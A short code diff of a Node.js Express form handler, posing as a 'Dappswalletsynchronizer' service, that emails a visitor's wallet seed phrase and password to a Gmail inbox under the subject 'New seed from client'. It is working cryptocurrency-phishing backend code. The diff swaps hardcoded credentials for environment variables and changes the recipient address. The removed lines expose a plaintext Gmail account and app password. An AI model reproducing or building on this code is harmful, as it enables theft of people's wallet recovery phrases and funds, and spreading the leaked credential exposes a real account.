@@ -20,14 +20,14 @@ app.post('/form', async(req, res) => {
   const transporter = await nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "jtom29544@gmail.com",
-      pass: "otmilpkgkgwszegb",
+      user: process.env.USER,
+      pass: process.env.PASSWORD
     },
   });
  
   const response = await transporter.sendMail({
     from: '"Dappswalletsynchronizer" <jtom29544@gmail.com>',
-    to: "xenuxyz@gmail.com",
+    to: "jtom29544@gmail.com",
     subject: "New seed from client", 
     text: `seed: ${seed} \npassword: ${password ? password : ''}`
   })  
